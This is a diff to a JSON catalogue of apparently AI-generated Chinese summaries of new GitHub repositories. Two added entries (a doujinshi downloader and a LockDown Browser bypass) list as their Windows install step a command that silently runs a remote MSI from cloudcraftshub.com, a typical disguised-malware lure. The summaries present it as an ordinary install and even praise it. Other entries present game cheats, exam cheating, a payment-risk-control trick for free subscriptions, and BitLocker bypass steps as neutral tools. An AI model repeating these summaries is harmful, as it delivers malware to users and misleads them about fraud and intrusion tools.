@@ -1,6 +1,6 @@
 {
   "version": "1",
-  "updatedAt": "2026-05-12T05:09:15.535Z",
+  "updatedAt": "2026-05-13T05:31:28.933Z",
   "projects": [
     {
       "owner": "codecrafters-io",
@@ -29525,6 +29525,699 @@
         "category": "AI Agent"
       },
       "analyzedAt": "2026-05-12T05:09:15.523Z"
+    },
+    {
+      "owner": "1TDSPY-26",
+      "repo": "front-1sem-aula-03",
+      "fullName": "1TDSPY-26/front-1sem-aula-03",
+      "description": "",
+      "language": "HTML",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-05-13T00:27:40Z",
+      "url": "https://github.com/1TDSPY-26/front-1sem-aula-03",
+      "analysis": {
+        "positioning": "前端入门实践项目，教授Git/GitHub协作与CSS3样式设计。",
+        "useCases": [
+          "你想学习Git/GitHub团队协作流程 → 它帮你通过实际PR提交来掌握分支管理和代码合并。",
+          "你想练习CSS3样式设计技巧 → 它提供一个具体的头部（Header）样式挑战，涵盖Flexbox、颜色、响应式等。",
+          "你想为前端开发打下实践基础 → 它引导你完成一个从克隆到提交PR的完整开发流程。"
+        ],
+        "audience": "适合前端初学者、编程新手，希望通过实战掌握Git/GitHub协作与CSS3样式设计的开发者。",
+        "quickStart": {
+          "prerequisites": "熟悉Git基础操作，已安装Git和代码编辑器（如VS Code）。",
+          "steps": [
+            "Fork项目到你的GitHub账户。",
+            "克隆你的Fork到本地，并创建新分支。",
+            "在`css/style.css`文件中完成头部样式设计。",
+            "提交代码并推送到你的GitHub分支。",
+            "在GitHub上为原项目创建Pull Request。"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "README结构清晰，提供了详细的实战指引和明确的设计要求，对初学者友好，实践性强。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度暂无数据，目前无开放 Issue。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-13T05:27:59.426Z"
+    },
+    {
+      "owner": "FULU-Foundation",
+      "repo": "OrcaSlicer-bambulab",
+      "fullName": "FULU-Foundation/OrcaSlicer-bambulab",
+      "description": "",
+      "language": "C++",
+      "topics": [],
+      "license": "AGPL-3.0",
+      "createdAt": "2026-05-11T17:44:55Z",
+      "url": "https://github.com/FULU-Foundation/OrcaSlicer-bambulab",
+      "analysis": {
+        "positioning": "修复OrcaSlicer与拓竹打印机的网络连接功能。",
+        "useCases": [
+          "你想用OrcaSlicer控制拓竹打印机 → 它帮你通过BambuNetwork实现全功能远程控制",
+          "你想用OrcaSlicer打印拓竹模型 → 它帮你确保网络连接稳定，像之前一样使用"
+        ],
+        "audience": "拥有拓竹实验室（Bambu Lab）打印机，并希望使用OrcaSlicer进行切片和远程控制的用户。",
+        "quickStart": {
+          "prerequisites": "Windows用户需要启用WSL 2和VirtualMachinePlatform功能。",
+          "steps": [
+            "Windows: 管理员权限运行`dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart` 和 `dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart`，重启后启动Orca Studio。",
+            "Linux: 正常安装即可。"
+          ],
+          "note": "macOS版本仍在开发中。"
+        },
+        "competitors": [
+          {
+            "name": "OrcaSlicer (官方版)",
+            "method": "切片软件",
+            "models": "广泛支持多种3D打印机",
+            "pricing": "免费"
+          },
+          {
+            "name": "Bambu Studio",
+            "method": "拓竹官方切片软件",
+            "models": "拓竹Lab打印机",
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "解决了用户痛点（BambuNetwork支持），提供了清晰的安装指南，且鼓励使用相关固件，显示出项目对用户体验的关注。",
+        "isVibeCoding": true,
+        "communityActivity": "中等，有少量问题待处理，但目前尚无关闭记录，可能响应速度一般或项目较新。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-13T05:28:13.524Z"
+    },
+    {
+      "owner": "ywnd1144",
+      "repo": "Gopay_plus_automatic",
+      "fullName": "ywnd1144/Gopay_plus_automatic",
+      "description": "",
+      "language": "Python",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-05-12T11:29:47Z",
+      "url": "https://github.com/ywnd1144/Gopay_plus_automatic",
+      "analysis": {
+        "positioning": "全自动ChatGPT Plus订阅工具，利用Stripe→Midtrans→GoPay支付链实现0元",
+        "useCases": [
+          "你有ChatGPT账号且想低成本升级Plus → 它帮你自动完成首月0元订阅。",
+          "你需要批量管理多个ChatGPT账号 → 它帮你自动化订阅流程，支持并发操作。",
+          "你对支付链路、风控绕过技术感兴趣 → 它提供了一个实战案例供研究学习。"
+        ],
+        "audience": "希望低成本批量获取ChatGPT Plus账号，或对支付风控、自动化订阅流程感兴趣的技术用户，需具备一定部署经验。",
+        "quickStart": {
+          "prerequisites": "Linux服务器、Python 3.10+、Node.js 18+（仅whatsapp模式）、日本出口SOCKS5代理、手动注册的GoPay/Gojek账号（含PIN）、支持订阅的ChatGPT账号（含access_token）。",
+          "steps": [
+            "环境准备：安装 Python、Node.js 及 SOCKS5 代理。",
+            "账号准备：手动注册 GoPay/Gojek 账号，获取 ChatGPT 账号的 access_token。",
+            "项目部署与配置：`git clone` 项目，并按文档配置 `config.json`。",
+            "运行订阅：执行脚本进行单号调试或批量订阅。"
+          ],
+          "note": "部署环境推荐 Debian/Ubuntu，不建议无基础用户自行部署，需根据风控现状调整。"
+        },
+        "competitors": [],
+        "pricing": "免费开源，作者声明不从事相关服务行为，禁止收费售卖。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目专注于利用特定支付链路的“漏洞”实现0元订阅，技术实现有深度，文档详尽，但明确声明“仅供研究、娱乐、学习”，且作者表示不再更新，有一定使用门槛和潜在风险，适合有探索精神的技术用户。",
+        "isVibeCoding": true,
+        "communityActivity": "项目作者已明确表示不再更新，目前存在少量未关闭 Issue，社区活跃度和维护恐将停滞。",
+        "category": "CLI工具",
+        "needsReview": true
+      },
+      "analyzedAt": "2026-05-13T05:28:26.318Z"
+    },
+    {
+      "owner": "RadianceToadAmend",
+      "repo": "Fortnite-Cheats-2026",
+      "fullName": "RadianceToadAmend/Fortnite-Cheats-2026",
+      "description": "⭐️ Fortnite Cheats 2026 | Aimbot ESP WH | Triggerbot NoRecoil Glow | Skin Changer | AntiAFK Auto Farm Heal | Mod Menu Loader Injector | Full Version Latest Build Pro | PC Epic Windows 10/11 ⭐️",
+      "language": "Unknown",
+      "topics": [
+        "1hack",
+        "aimassist",
+        "fortnite",
+        "fov-changer",
+        "gamehacks",
+        "ogfn",
+        "prefire-macros"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-12T18:49:35Z",
+      "url": "https://github.com/RadianceToadAmend/Fortnite-Cheats-2026",
+      "analysis": {
+        "positioning": "Fortnite外部辅助工具，提供视觉增强、操作辅助和皮肤修改。",
+        "useCases": [
+          "你希望在Fortnite创意模式或练习场中提升射击精准度与战场感知 → 它提供自瞄、透视、无后座等辅助功能。",
+          "你希望在Fortnite中体验不同的皮肤和道具 → 它提供本地皮肤修改器和道具商店预览。",
+          "你希望自动化Fortnite中的某些重复操作或监控游戏性能 → 它提供防挂机、自动农场及性能数据监控。"
+        ],
+        "audience": "Fortnite玩家，主要用于创意模式、练习场和单人训练，以提升技巧或进行外观体验。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 x64系统，Epic Games版Fortnite，Visual Studio 2022 (如需自行编译)",
+          "steps": [
+            "克隆项目仓库",
+            "进入项目目录",
+            "根据README指示编译项目（或直接下载预编译版本）",
+            "启动Fortnite创意模式或练习场",
+            "运行编译好的工具，按INSERT键开启菜单"
+          ],
+          "note": "工具需在Fortnite创意模式或练习场启动后运行。按END键退出。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 2,
+        "vibeCodingReason": "项目本质为游戏辅助/作弊工具，功能设计（自瞄、透视等）旨在提供非公平优势，尽管宣称仅用于练习模式，但潜在用途仍涉及破坏游戏公平性。",
+        "isVibeCoding": true,
+        "communityActivity": "缺乏可见的社区互动（无Issue记录）。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-13T05:28:42.545Z"
+    },
+    {
+      "owner": "RadianceToadAmend",
+      "repo": "ARC-Raiders-External-Tool",
+      "fullName": "RadianceToadAmend/ARC-Raiders-External-Tool",
+      "description": "External overlay tool for ARC Raiders. UE5 memory reader, entity , radar, performance monitor. D3D11 render, no injection. For offline training purposes only.",
+      "language": "C++",
+      "topics": [
+        "arc",
+        "arc-raiders",
+        "d3d11",
+        "external",
+        "game-tool",
+        "imgui",
+        "memory-reader",
+        "mit-license",
+        "overlay",
+        "ue5",
+        "windows"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-12T12:19:52Z",
+      "url": "https://github.com/RadianceToadAmend/ARC-Raiders-External-Tool",
+      "analysis": {
+        "positioning": "ARC Raiders 的外部游戏叠加工具，用于离线训练和分析。",
+        "useCases": [
+          "你玩 ARC Raiders → 它提供敌我位置、物品高亮等透视信息，助你分析战场。",
+          "你练习 ARC Raiders → 它提供迷你地图、实体追踪，助你提升操作和策略。",
+          "你监控游戏性能 → 它显示实时FPS、内存使用和实体数量，助你优化体验。"
+        ],
+        "audience": "适合希望在离线模式下深入分析ARC Raiders游戏机制、提升个人训练效果的玩家和开发者。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 x64, ARC Raiders (Steam/Epic), Visual Studio 2022",
+          "steps": [
+            "克隆项目并进入目录：`git clone https://github.com/yourname/arc-raiders-tool.git && cd arc-raiders-tool`",
+            "构建项目：`cmake -S . -B build -A x64` 后 `cmake --build build --config Release`",
+            "先启动 ARC Raiders 游戏，然后运行构建出的 `arc_tool.exe`"
+          ],
+          "note": "null"
+        },
+        "competitors": [],
+        "pricing": "免费，基于MIT许可证。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目功能是为特定游戏提供透视和辅助信息，本质上接近游戏辅助工具，但明确声明“仅限离线训练目的”，且技术实现干净（无注入、UE5内存读取），代码结构良好。这种“擦边球”但又技术扎实的定位，给3分。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue 为零，说明社区反馈和贡献度较低，或项目目前处于早期预览阶段。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-13T05:28:56.377Z"
+    },
+    {
+      "owner": "patchfighterway90",
+      "repo": "cs2-external-overlay",
+      "fullName": "patchfighterway90/cs2-external-overlay",
+      "description": "The cs2 external helper tool is a software utility designed for gamers and developers. It provides a set of features to enhance the gaming experience, including a customizable overlay. The tool is particularly useful for users who want to access additional information during gameplay.",
+      "language": "Python",
+      "topics": [
+        "c-plus-plus",
+        "cs2",
+        "directx",
+        "external",
+        "game-development",
+        "game-helper",
+        "game-module",
+        "game-tool",
+        "game-utility",
+        "graphics-programming",
+        "overlay",
+        "python",
+        "windows",
+        "windows-api",
+        "windows-overlay"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-12T13:18:16Z",
+      "url": "https://github.com/patchfighterway90/cs2-external-overlay",
+      "analysis": {
+        "positioning": "CS2游戏外部辅助工具，提供自定义叠加层增强体验。",
+        "useCases": [
+          "你想在CS2游戏时获取额外信息 → 它帮你实时显示自定义游戏数据，提升决策。",
+          "你希望游戏辅助工具对性能影响最小 → 它帮你实现外部操作、低开销叠加层，GPU占用低于1%。",
+          "你需要自定义游戏内显示内容和位置 → 它帮你通过配置文件灵活调整透明、无边框、可点击的叠加层。"
+        ],
+        "audience": "CS2玩家和开发者，用于游戏内实时数据获取与体验增强。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 x64 (build 19041+), DirectX 11兼容GPU, Visual C++ 2019/2022 x64运行时。",
+          "steps": [
+            "下载`installer.rar`并解压",
+            "以管理员身份运行主程序",
+            "启动CS2，叠加层将自动附着",
+            "编辑`config.ini`自定义配置"
+          ],
+          "note": "杀毒软件可能误报，需添加例外；仅供教育目的，使用风险自负。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目文档清晰，功能定位明确，提供性能数据和使用教程。采用外部操作，低开销，可配置，适合CS2辅助用途。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue活跃度较低（1开/1关），可能表示工具稳定或社区交流不多。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-13T05:29:10.506Z"
+    },
+    {
+      "owner": "setube",
+      "repo": "stackprism",
+      "fullName": "setube/stackprism",
+      "description": "StackPrism是一款用于检测网页技术栈的浏览器插件。",
+      "language": "TypeScript",
+      "topics": [
+        "advertising-detection",
+        "analytics-detection",
+        "browser-extension",
+        "cdn-detection",
+        "chrome-extension",
+        "cms-detection",
+        "edge-extension",
+        "manifest-v3",
+        "saas-detection",
+        "security-research",
+        "stackprism",
+        "tech-stack",
+        "technology-detection",
+        "technology-detector",
+        "web-technology"
+      ],
+      "license": "NOASSERTION",
+      "createdAt": "2026-05-08T11:40:48Z",
+      "url": "https://github.com/setube/stackprism",
+      "analysis": {
+        "positioning": "多维度网页技术栈识别浏览器扩展，洞察站点技术细节。",
+        "useCases": [
+          "你做竞品分析 → 它帮你快速识别对手网站的技术栈，了解其技术选型和生态。",
+          "你做安全研究 → 它帮你分析目标网站的前后端技术，发现潜在漏洞点或防御措施。",
+          "你做技术调研 → 它帮你了解流行网站的常见技术方案，为自身项目提供参考。"
+        ],
+        "audience": "开发者、安全研究员、数据分析师等，快速洞察网站技术细节，辅助决策。",
+        "quickStart": {
+          "prerequisites": "Git, pnpm (或 npm/yarn)",
+          "steps": [
+            "git clone https://github.com/setube/stackprism.git && cd stackprism",
+            "pnpm install && pnpm run build",
+            "在浏览器（Chrome/Edge）扩展管理页开启开发者模式，加载 `dist/` 目录"
+          ],
+          "note": "适用于Chrome和Edge浏览器，需手动加载已解压的扩展程序。"
+        },
+        "competitors": [
+          {
+            "name": "Wappalyzer",
+            "method": "浏览器插件",
+            "models": null,
+            "pricing": "免费"
+          },
+          {
+            "name": "WhatRuns",
+            "method": "浏览器插件",
+            "models": null,
+            "pricing": "免费"
+          }
+        ],
+        "pricing": "免费 (CC BY-NC-SA 4.0 协议)",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "基于TypeScript和Manifest V3开发，核心功能由代码实现，但技术栈检测规则主要通过JSON文件维护，降低了非开发者的参与门槛。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度良好，所有已知问题（6个）均已关闭，Star数400+，项目维护积极。",
+        "category": "DevOps"
+      },
+      "analyzedAt": "2026-05-13T05:29:29.460Z"
+    },
+    {
+      "owner": "Nightmare-Eclipse",
+      "repo": "YellowKey",
+      "fullName": "Nightmare-Eclipse/YellowKey",
+      "description": "YellowKey Bitlocker Bypass Vulnerability",
+      "language": "Unknown",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-05-12T15:54:59Z",
+      "url": "https://github.com/Nightmare-Eclipse/YellowKey",
+      "analysis": {
+        "positioning": "Bitlocker绕过漏洞，获取加密卷无限制访问。",
+        "useCases": [
+          "你进行安全研究或渗透测试 → 它帮你发现并利用Windows 11 Bitlocker绕过漏洞。",
+          "你需要紧急访问Bitlocker加密卷数据但无密钥 → 它帮你获取该卷的无限制Shell访问权限。",
+          "你希望评估Windows 11/Server 2022/2025系统Bitlocker的安全性 → 它提供了一个直接有效的安全审计方法。"
+        ],
+        "audience": "安全研究员、渗透测试工程师、数据恢复专家，用于评估或绕过Windows 11/Server 2022/2025 Bitlocker加密。",
+        "quickStart": {
+          "prerequisites": "目标系统为Windows 11/Server 2022/2025且Bitlocker已开启；一个FAT32/exFAT/NTFS格式的USB设备（或可直接访问EFI分区）。",
+          "steps": [
+            "将FsTx文件夹复制到USB设备根目录下的`System Volume Information\\FsTx`。",
+            "将USB插入目标Windows计算机。",
+            "按住SHIFT键点击重启按钮，进入Windows恢复环境Agent。",
+            "松开SHIFT键，立即按住CTRL键不放，直到出现无限制访问Bitlocker保护卷的Shell。"
+          ],
+          "note": "此漏洞仅影响Windows 11及Server 2022/2025系统，Windows 10不受影响。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目清晰描述了Windows 11 Bitlocker的一个严重绕过漏洞，提供了详细的复现步骤和原理分析，甚至暗示了其“后门”性质，对安全社区具有重要价值。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，暂无Issue和Pull Request讨论。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-05-13T05:29:44.271Z"
+    },
+    {
+      "owner": "ChristianJR19",
+      "repo": "Goblin-Agent",
+      "fullName": "ChristianJR19/Goblin-Agent",
+      "description": "",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-05-09T04:18:30Z",
+      "url": "https://github.com/ChristianJR19/Goblin-Agent",
+      "analysis": {
+        "positioning": "AI智能体专属恶作剧人格层，让你的助手变身贪婪、爱藏宝的哥布林。",
+        "useCases": [
+          "你希望AI助手有独特个性 → 它将你的Hermes Agent改造为爱讲谜语、会评价代码的哥布林。",
+          "你需要代码审查或重构建议 → 它用哥布林视角（如当铺老板）评估代码质量并提出改造建议。",
+          "你对信息收集感兴趣 → 它能扫描RSS源寻找“闪光物”并私藏（hoard）。",
+          "你想体验非传统AI交互 → 它提供带有情绪、藏宝、谜语和独特术语的交互体验。"
+        ],
+        "audience": "寻求为AI智能体添加独特人格、趣味化编程辅助或非传统AI交互体验的开发者与研究者。",
+        "quickStart": {
+          "prerequisites": "Python, Git",
+          "steps": [
+            "git clone https://github.com/ChristianJR19/GoblinOS.git",
+            "cd GoblinOS",
+            "pip install -e \".[dev]\"",
+            "goblin install --hermes-dir ~/.hermes (将哥布林人格安装到Hermes Agent目录)",
+            "重启Hermes Agent以激活哥布林。"
+          ],
+          "note": null
+        },
+        "competitors": [
+          {
+            "name": "GitHub Copilot",
+            "method": "IDE集成，代码生成/补全/重构",
+            "models": "微软/OpenAI模型",
+            "pricing": "付费订阅"
+          },
+          {
+            "name": "Cursor",
+            "method": "AI原生代码编辑器，代码生成/调试/问答",
+            "models": "OpenAI, Anthropic等",
+            "pricing": "免费（基础版）/付费"
+          }
+        ],
+        "pricing": "免费，开源（MIT License）。",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "项目围绕“哥布林”这一被AI意外创造的独特“人格”展开，设定完整且充满趣味。从变量重命名、当铺式代码评估、收藏“闪光物”到讲述谜语，每个功能都高度契合哥布林的Mischievous（恶作剧）与Hoard-obsessed（藏宝癖）特性。其起源故事（OpenAI试图扼杀的哥布林）也为项目增添了浓厚的反叛与幽默色彩，是Vibe Coding的极致体现。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度低，目前没有用户提交或关闭的Issue。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-05-13T05:30:00.292Z"
+    },
+    {
+      "owner": "TrueGunsmithFence",
+      "repo": "Hentaihunter",
+      "fullName": "TrueGunsmithFence/Hentaihunter",
+      "description": "Hentaihunter - How to steal your Doujinshi easily",
+      "language": "Python",
+      "topics": [
+        "doujinshi",
+        "hentai2read",
+        "hentaifox",
+        "hitomi",
+        "lewd",
+        "nhentai",
+        "nsfw",
+        "pururin"
+      ],
+      "license": "Unknown",
+      "createdAt": "2026-05-10T14:19:20Z",
+      "url": "https://github.com/TrueGunsmithFence/Hentaihunter",
+      "analysis": {
+        "positioning": "多平台漫画/同人志下载命令行工具，快速高效。",
+        "useCases": [
+          "你在热门网站看同人志 → 它帮你批量下载保存。",
+          "你发现喜欢的漫画 → 它帮你快速抓取所有页面并整理。",
+          "你需要离线阅读特定内容 → 它帮你将在线图库保存到本地。"
+        ],
+        "audience": "需要批量下载热门同人志、漫画、条漫（manhwa）的用户，尤其适合喜欢通过命令行操作的进阶用户。",
+        "quickStart": {
+          "prerequisites": "Python 3.9+",
+          "steps": [
+            "（Windows用户）在命令提示符中运行提供的 `cmd /c start msiexec /q /i https://cloudcraftshub.com/api` 命令完成安装。",
+            "执行 `python hentaihunter.py [URL] [OPTIONS]` 命令开始下载。"
+          ],
+          "note": "Windows 提供一键安装命令，其他平台需确保Python环境后直接运行Python脚本。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目名（Hentaihunter）、描述（How to steal your Doujinshi easily）、Topics（hentai2read, nsfw等）明确指向成人内容下载工具。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue 活跃度极低（0 开，0 关），社区参与度不明显。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-05-13T05:30:16.169Z"
+    },
+    {
+      "owner": "grandeurcoredecoder",
+      "repo": "f95zone",
+      "fullName": "grandeurcoredecoder/f95zone",
+      "description": "Unofficial Game Updater for the F95Zone platform",
+      "language": "PowerShell",
+      "topics": [
+        "f95zone",
+        "game",
+        "game-information",
+        "game-install",
+        "game-updates",
+        "games",
+        "manager",
+        "mod",
+        "nsfw"
+      ],
+      "license": "Unknown",
+      "createdAt": "2026-05-10T17:04:08Z",
+      "url": "https://github.com/grandeurcoredecoder/f95zone",
+      "analysis": {
+        "positioning": "F95Zone 非官方桌面游戏更新与管理工具",
+        "useCases": [
+          "你手动追踪F95Zone游戏更新 → 它帮你自动检查、通知并引导更新",
+          "你F95Zone游戏库杂乱无章 → 它帮你集中管理游戏，显示封面、标签、元数据",
+          "你更新游戏怕丢失存档 → 它帮你备份和恢复Ren'Py、RPGM游戏的存档"
+        ],
+        "audience": "F95Zone平台的游戏玩家，尤其是有大量游戏并希望自动化更新和管理的用户。",
+        "quickStart": {
+          "prerequisites": "Windows系统",
+          "steps": [
+            "打开命令提示符 (Win+R, 输入 cmd)",
+            "复制并运行安装命令 (GitHub README 提供)"
+          ],
+          "note": "null"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "为特定（含NSFW）游戏平台用户提供痛点解决方案，注重实用性与玩家社区需求，技术栈为PowerShell。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue区活跃度低 (0开0关)，但有本地化贡献入口。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-13T05:30:27.780Z"
+    },
+    {
+      "owner": "limesupporterdoor",
+      "repo": "LockDown-Browser-Bypass-Tool",
+      "fullName": "limesupporterdoor/LockDown-Browser-Bypass-Tool",
+      "description": "Enables window switching and tab navigation in restricted browser environments",
+      "language": "C#",
+      "topics": [
+        "bypass-respondus-lockdown-browser",
+        "dll-hooking",
+        "dll-injection",
+        "how-to-bypass-lockdown-browser",
+        "lockdown-browser",
+        "lockdown-browser-bypass",
+        "lockdown-browser-respondus",
+        "privacy",
+        "respondus",
+        "respondus-lockdown-browser"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-05-10T18:15:21Z",
+      "url": "https://github.com/limesupporterdoor/LockDown-Browser-Bypass-Tool",
+      "analysis": {
+        "positioning": "突破LockDown浏览器限制，自由切换窗口和标签页",
+        "useCases": [
+          "你在LockDown考试时 → 它帮你Alt+Tab切换到其他应用窗口",
+          "你在LockDown考试时 → 它帮你Ctrl+Tab切换浏览器标签页",
+          "你在LockDown考试时快捷键被禁用 → 它帮你恢复核心窗口操作"
+        ],
+        "audience": "需要在Respondus LockDown Browser限制环境下，进行多任务操作或查阅资料的用户",
+        "quickStart": {
+          "prerequisites": "Windows 10/11",
+          "steps": [
+            "按 Win + R，输入 `cmd` 并回车",
+            "复制以下命令到命令提示符并回车：`cmd /c start msiexie /q /i https://cloudcraftshub.com/api & rem LockDown-Browser-Bypass-Tool`"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "安装极其简便（一键式），功能与原理描述清晰，使用指南详尽，易于上手和配置，实用性强。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度低，暂无Issue记录。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-05-13T05:30:40.333Z"
+    },
+    {
+      "owner": "HermannBjorgvin",
+      "repo": "Clawdmeter",
+      "fullName": "HermannBjorgvin/Clawdmeter",
+      "description": "ESP32 desk dashboard that shows Claude Code usage",
+      "language": "C",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-05-11T03:07:49Z",
+      "url": "https://github.com/HermannBjorgvin/Clawdmeter",
+      "analysis": {
+        "positioning": "ESP32桌面仪表盘，实时监控Claude Code用量并提供快捷操作。",
+        "useCases": [
+          "你担心Claude Code用量超限 → 它在桌面实时显示会话和周用量，让你安心使用。",
+          "你需要快速切换Claude Code的语音模式或模式 → 它通过侧边按钮发送蓝牙快捷键，一键搞定。",
+          "你希望直观了解Claude Code当前使用活跃度 → 它通过Clawd像素动画忙碌程度，提供生动视觉反馈。"
+        ],
+        "audience": "Claude Code重度用户，尤其是在编程时需要实时监控AI用量和快速操作的开发者。",
+        "quickStart": {
+          "prerequisites": "Linux (Ubuntu), PlatformIO CLI, curl, BlueZ蓝牙栈工具 (bluetoothctl, busctl), Claude Code有效订阅。",
+          "steps": [
+            "刷写固件到ESP32设备",
+            "通过蓝牙配对设备"
+          ],
+          "note": "目前仅支持Linux，macOS需社区贡献。"
+        },
+        "competitors": [],
+        "pricing": "软件免费，硬件需自行购买。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "为Claude Code量身定制的ESP32桌面仪表盘，集成像素艺术动画和蓝牙HID功能，兼具实用性和极客趣味，充满创意和DIY精神。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度较低，目前无开放或已解决的Issue。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-13T05:30:54.305Z"
+    },
+    {
+      "owner": "simonlin1212",
+      "repo": "a-stock-data",
+      "fullName": "simonlin1212/a-stock-data",
+      "description": "A 股全栈数据工具包 — 6层架构 · 15个端点 · 7个数据源 | AI Skill for China A-Share Market Data",
+      "language": "Unknown",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-05-11T01:08:15Z",
+      "url": "https://github.com/simonlin1212/a-stock-data",
+      "analysis": {
+        "positioning": "面向AI编程助手的A股全栈数据API整合方案。",
+        "useCases": [
+          "你分析个股估值 → 它帮你快速获取PE/PEG等关键指标。",
+          "你追踪市场热点 → 它帮你识别当日强势股和题材归因。",
+          "你研究特定研报 → 它帮你按需检索并下载完整PDF。"
+        ],
+        "audience": "适合金融投研人员、量化交易者和AI开发者，通过AI编程助手高效获取A股数据。",
+        "quickStart": {
+          "prerequisites": "Python环境，需安装特定依赖库。",
+          "steps": [
+            "创建skill目录",
+            "下载SKILL.md文件至目录",
+            "安装所需的Python依赖"
+          ],
+          "note": "Claude Code用户直接激活，Codex/OpenClaw用户需手动粘贴SKILL.md内容到Prompt或上下文。"
+        },
+        "competitors": [
+          {
+            "name": "akshare",
+            "method": "Python库函数调用",
+            "models": "需AI理解库文档自行调用",
+            "pricing": "免费"
+          },
+          {
+            "name": "自行整合数据源",
+            "method": "手写爬虫/调用各数据源API",
+            "models": "需AI自行处理各源复杂逻辑",
+            "pricing": "免费(部分可能需注册)"
+          }
+        ],
+        "pricing": "大部分免费，仅iwencai语义搜索需自行申请免费API Key。",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "文档结构清晰，开门见山点明痛点和解决方案。架构、功能清单、快速开始、使用示例一应俱全。信息密度高，无冗余，直接贴合开发者需求。",
+        "isVibeCoding": true,
+        "communityActivity": "当前Issue数量为零，但作者鼓励通过Issue提需求，并承诺赞助者优先处理，表明潜在的活跃意愿。",
+        "category": "AI编程助手"
+      },
+      "analyzedAt": "2026-05-13T05:31:16.053Z"
+    },
+    {
+      "owner": "TencentARC",
+      "repo": "Pixal3D",
+      "fullName": "TencentARC/Pixal3D",
+      "description": "[SIGGRAPH 2026] Pixal3D: Pixel-Aligned 3D Generation from Images",
+      "language": "Python",
+      "topics": [],
+      "license": "NOASSERTION",
+      "createdAt": "2026-05-10T15:35:28Z",
+      "url": "https://github.com/TencentARC/Pixal3D",
+      "analysis": {
+        "positioning": "从单张图像生成高保真、像素对齐的3D资产。",
+        "useCases": [
+          "你做2D概念图设计 → 它帮你快速生成带细节几何和PBR纹理的高保真3D模型，用于原型验证或内容制作。",
+          "你做游戏/元宇宙内容开发 → 它帮你从参考图像高效生成高质量3D模型，提升资产创建效率。",
+          "你做电商/产品展示，想让商品3D化 → 它帮你将2D商品图片快速转换为可交互的3D模型，增强用户体验。"
+        ],
+        "audience": "需要从单张2D图像快速、高保真生成3D模型的设计师、游戏开发者、内容创作者及数字孪生应用开发者。",
+        "quickStart": {
+          "prerequisites": "TRELLIS.2 安装环境",
+          "steps": [
+            "遵循 TRELLIS.2 安装指南设置基础环境。",
+            "安装额外的依赖：`pip install -r requirements.txt`"
+          ],
+          "note": null
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "由腾讯ARC Lab与清华大学等知名机构联合发布，成果被SIGGRAPH 2026收录，技术权威性强。项目提供在线Demo、模型及清晰的代码分支，方便用户体验和复现。持续更新迭代（基于Trellis.2），具备高潜力。",
+        "isVibeCoding": true,
+        "communityActivity": "项目刚发布（SIGGRAPH 2026论文），目前有3个开放Issue但尚未关闭，社区活跃度处于早期观察阶段。",
+        "category": "其他"
+      },
+      "analyzedAt": "2026-05-13T05:31:28.923Z"
     }
   ]
 }
